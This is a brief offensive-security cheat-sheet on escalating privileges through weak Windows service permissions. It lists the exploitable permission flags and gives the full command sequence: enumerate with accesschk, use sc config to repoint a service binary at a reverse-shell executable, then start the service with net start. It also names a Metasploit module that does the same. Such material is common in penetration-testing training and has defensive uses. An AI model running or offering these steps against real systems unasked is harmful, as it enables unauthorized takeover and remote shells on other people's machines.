# Insecure Service Permissions

## Interesting Service Permissions

| Permission          | Description                                               |
|---------------------|-----------------------------------------------------------|
| GENERIC_ALL         | Inherits `SERVICE_CHANGE_CONFIG`                          |
| GENERIC_WRITE       | Inherits `SERVICE_CHANGE_CONFIG`                          |
| SERVICE_CHANGE_CONFIG | Able to alter service binary                            |
| WRITE_DAC           | Able to alter permissions → `SERVICE_CHANGE_CONFIG`       |
| WRITE_OWNER         | Able to become owner and change permissions               |

### 1) Acesschk.exe can be used to check what permission a particular user has to services. A wildcard is used to check all services.

    .\accesschk.exe /accepteula -uwcqv "<User>" *

### 2) The command below can be used to alter the binary to a new, malicious binary.

    sc config svcexample binpath= "\"C:\PrivEsc\reverse_shell.exe\""

### 3) Once the binary path has been changed the service can then be started by either using the command below or rebooting the system if permissions allow.

    net start <ServiceName>

## Alternate Method: Metasploit

    use exploit/windows/local/service_permissions

